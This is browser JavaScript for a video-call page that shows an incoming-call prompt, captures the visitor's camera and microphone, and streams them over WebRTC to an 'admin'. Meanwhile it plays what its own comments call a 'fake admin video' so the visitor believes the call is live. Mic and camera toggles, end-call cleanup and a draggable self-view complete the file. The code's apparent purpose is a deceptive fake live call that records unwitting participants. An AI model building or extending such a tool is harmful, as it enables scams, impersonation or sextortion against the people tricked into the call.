const socket = io();

// Get Room ID
const urlParams = new URLSearchParams(window.location.search);
const roomId = urlParams.get('room') || 'room-1';

// UI Elements
const waitingRoom = document.getElementById('waiting-room');
const videoInterface = document.getElementById('video-interface');
const callModal = document.getElementById('call-modal');
const acceptBtn = document.getElementById('accept-btn');
const myVideo = document.getElementById('my-camera');
const mainVideo = document.getElementById('main-video');

// CALL CONTROL BUTTONS
const micBtn = document.getElementById('mic-btn');
const videoBtn = document.getElementById('video-btn');
const endCallBtn = document.getElementById('end-call-btn');

let localStream = null;
let peerConnection = null;
let micEnabled = true;
let videoEnabled = true;

const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

// 1. Join Room
socket.emit('join_room', roomId);

// 2. Listen for "Incoming Call"
socket.on('incoming_call', () => {
    waitingRoom.classList.add('hidden');
    callModal.classList.remove('hidden');
});

// 3. Handle "Accept" Click
acceptBtn.addEventListener('click', () => {

    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {

            // UI Switch
            callModal.classList.add('hidden');
            videoInterface.classList.remove('hidden');

            // Save stream
            localStream = stream;

            // Show user's camera
            myVideo.srcObject = stream;

            // Play fake admin video
            mainVideo.play();

            // Start WebRTC
            createPeerConnection();
        })
        .catch(err => {
            alert("You must allow camera access to join the call.");
            console.error(err);
        });
});

// --- WebRTC CONNECTION ---
function createPeerConnection() {
    peerConnection = new RTCPeerConnection(rtcConfig);

    // Add local tracks
    localStream.getTracks().forEach(track => {
        peerConnection.addTrack(track, localStream);
    });

    // Create Offer
    peerConnection.createOffer()
        .then(offer => peerConnection.setLocalDescription(offer))
        .then(() => {
            socket.emit('webrtc_offer', {
                roomId,
                sdp: peerConnection.localDescription
            });
        });

    // Send ICE candidates
    peerConnection.onicecandidate = (event) => {
        if (event.candidate) {
            socket.emit('webrtc_ice_candidate', {
                roomId,
                candidate: event.candidate
            });
        }
    };
}

// Receive Answer from Admin
socket.on('webrtc_answer', (sdp) => {
    if (peerConnection) {
        peerConnection.setRemoteDescription(new RTCSessionDescription(sdp));
    }
});

// Receive ICE candidates
socket.on('webrtc_ice_candidate', (candidate) => {
    if (peerConnection) {
        peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
    }
});

// =========================
// 🎯 CALL CONTROL BUTTONS
// =========================

// MIC ON / OFF
micBtn.addEventListener('click', () => {
    if (!localStream) return;

    const audioTrack = localStream.getAudioTracks()[0];
    audioTrack.enabled = !audioTrack.enabled;
    micEnabled = audioTrack.enabled;

    micBtn.textContent = micEnabled ? "🎤" : "🔇";
});

// VIDEO ON / OFF
videoBtn.addEventListener('click', () => {
    if (!localStream) return;

    const videoTrack = localStream.getVideoTracks()[0];
    videoTrack.enabled = !videoTrack.enabled;
    videoEnabled = videoTrack.enabled;

    videoBtn.textContent = videoEnabled ? "📷" : "🚫";
});

// END CALL (CUT CALL) — BULLET PROOF FIX
endCallBtn.addEventListener('click', () => {

    // Stop camera & mic tracks
    if (localStream) {
        localStream.getTracks().forEach(track => track.stop());
        localStream = null;
    }

    // HARD STOP for fake video (prevents any sound returning)
    mainVideo.pause();
    mainVideo.src = "";
    mainVideo.srcObject = null;
    mainVideo.load();
    mainVideo.muted = true;

    // Close WebRTC connection
    if (peerConnection) {
        peerConnection.close();
        peerConnection = null;
    }

    // Reset UI
    videoInterface.classList.add('hidden');
    waitingRoom.classList.remove('hidden');

    // Notify Admin
    socket.emit('end_call', roomId);
});

// =========================
// 🎯 DRAGGABLE SMALL CAMERA
// =========================

let isDragging = false;
let offsetX = 0;
let offsetY = 0;

// Start Drag
myVideo.addEventListener('mousedown', startDrag);
myVideo.addEventListener('touchstart', startDrag);

function startDrag(e) {
    isDragging = true;
    myVideo.style.cursor = "grabbing";

    const rect = myVideo.getBoundingClientRect();

    if (e.type === "touchstart") {
        offsetX = e.touches[0].clientX - rect.left;
        offsetY = e.touches[0].clientY - rect.top;
    } else {
        offsetX = e.clientX - rect.left;
        offsetY = e.clientY - rect.top;
    }
}

// Move
document.addEventListener('mousemove', drag);
document.addEventListener('touchmove', drag);

function drag(e) {
    if (!isDragging) return;

    let x, y;

    if (e.type === "touchmove") {
        x = e.touches[0].clientX - offsetX;
        y = e.touches[0].clientY - offsetY;
    } else {
        x = e.clientX - offsetX;
        y = e.clientY - offsetY;
    }

    myVideo.style.left = x + "px";
    myVideo.style.top = y + "px";
    myVideo.style.bottom = "auto";
    myVideo.style.right = "auto";
}

// Release + Snap to nearest corner
document.addEventListener('mouseup', stopDrag);
document.addEventListener('touchend', stopDrag);

function stopDrag() {
    if (!isDragging) return;

    isDragging = false;
    myVideo.style.cursor = "grab";

    const rect = myVideo.getBoundingClientRect();
    const screenWidth = window.innerWidth;
    const screenHeight = window.innerHeight;

    const distances = {
        topLeft: Math.hypot(rect.left, rect.top),
        topRight: Math.hypot(screenWidth - rect.right, rect.top),
        bottomLeft: Math.hypot(rect.left, screenHeight - rect.bottom),
        bottomRight: Math.hypot(screenWidth - rect.right, screenHeight - rect.bottom)
    };

    const closest = Object.keys(distances).reduce((a, b) =>
        distances[a] < distances[b] ? a : b
    );

    // Reset positioning
    myVideo.style.top = "";
    myVideo.style.bottom = "";
    myVideo.style.left = "";
    myVideo.style.right = "";

    // Snap to closest corner
    if (closest === "topLeft") {
        myVideo.style.top = "20px";
        myVideo.style.left = "20px";
    } else if (closest === "topRight") {
        myVideo.style.top = "20px";
        myVideo.style.right = "20px";
    } else if (closest === "bottomLeft") {
        myVideo.style.bottom = "20px";
        myVideo.style.left = "20px";
    } else {
        myVideo.style.bottom = "20px";
        myVideo.style.right = "20px";
    }
}
